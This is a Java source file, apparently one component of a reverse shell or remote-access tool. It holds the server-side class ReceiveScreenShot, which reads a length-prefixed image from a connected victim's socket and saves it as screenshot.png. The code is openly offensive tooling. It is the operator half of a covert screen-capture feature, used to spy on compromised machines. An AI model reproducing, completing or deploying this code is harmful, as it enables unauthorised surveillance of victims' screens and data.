package obs1d1anc1ph3r.reverseshell.server;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.net.Socket;
import javax.imageio.ImageIO;

public class ReceiveScreenShot {

    public void receiveScreenshot() {
        new Thread(() -> {
            try {
                ReverseShellServer server = new ReverseShellServer();
                Socket clientSocket = server.getClientSocket();
                DataInputStream dataIn = new DataInputStream(clientSocket.getInputStream());

                int fileSize = dataIn.readInt();
                System.out.println("[*] Expecting screenshot of size: " + fileSize);

                byte[] imageBytes = new byte[fileSize];
                dataIn.readFully(imageBytes);

                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
                BufferedImage image = ImageIO.read(byteArrayInputStream);

                if (image != null) {
                    File outputFile = new File("screenshot.png");
                    ImageIO.write(image, "png", outputFile);
                    System.out.println("[*] Screenshot received and saved as " + outputFile.getAbsolutePath());
                } else {
                    System.err.println("[ERROR] Failed to decode the screenshot image.");
                }
            } catch (IOException e) {
                System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
            }
        }).start();
    }
}
